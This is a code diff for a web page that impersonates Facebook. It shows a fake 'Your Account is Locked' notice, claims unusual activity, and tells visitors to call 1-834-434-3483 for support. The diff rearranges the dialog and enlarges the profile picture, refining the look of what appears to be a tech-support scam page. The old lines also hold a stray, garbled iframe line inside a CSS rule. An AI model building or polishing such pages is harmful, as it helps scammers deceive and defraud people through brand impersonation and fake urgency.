@@ -130,13 +130,30 @@
     }
 
     .forgot-password a:hover {
-iframe: https://www.youtube.com/watch?v=5Z8H2CQo1dU
-      text-align: center;
-      margin-top: 16px;
+      text-decoration: underline;
     }
 
-    .forgot-password a:hover {
-      text-decoration: underline;
+    .dialog-container {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 998;
+    }
+
+    .profile-pic {
+      width: 200px;
+      height: 200px;
+      border-radius: 50%;
+      background: #e4e6eb;
+      border: 4px solid #ffffff;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+      position: absolute;
+      z-index: 998;
+      transform: translateY(-20px); /* Slightly offset to align with dialog */
     }
 
     .dialog-box {
@@ -146,21 +163,9 @@ iframe: https://www.youtube.com/watch?v=5Z8H2CQo1dU
       width: 432px;
       padding: 24px;
       text-align: center;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
+      position: relative;
       z-index: 1000;
-    }
-
-    .profile-pic {
-      width: 80px;
-      height: 80px;
-      border-radius: 50%;
-      margin: 0 auto 15px;
-      background: #e4e6eb;
-      border: 2px solid #ffffff;
-      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+      margin-left: 100px; /* Shift dialog to overlap half of profile pic */
     }
 
     .dialog-box h2 {
@@ -223,7 +228,7 @@ iframe: https://www.youtube.com/watch?v=5Z8H2CQo1dU
       width: 100%;
       height: 100%;
       background: rgba(0, 0, 0, 0.6);
-      z-index: 999;
+      z-index: 997;
     }
   </style>
 </head>
@@ -250,14 +255,14 @@ iframe: https://www.youtube.com/watch?v=5Z8H2CQo1dU
       </div>
     </div>
   </div>
-  <div class="dialog-box">
+  <div class="dialog-container">
     <div class="profile-pic"></div>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
-    <h2>Your Account is Locked</h2>
-    <p>We detected unusual activity on your account. For your security, your account has been temporarily locked. Please contact our support team to regain access.</p>
-    <p class="phone-number">
-      Call us at: 1-834-434-3483
-    </p>
+    <div class="dialog-box">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
+      <h2>Your Account is Locked</h2>
+      <p>We detected unusual activity on your account. For your security, your account has been temporarily locked. Please contact our support team to regain access.</p>
+      <p class="phone-number">Call us at: 1-834-434-3483</p>
+    </div>
   </div>
   <div class="footer">
     <div class="languages">
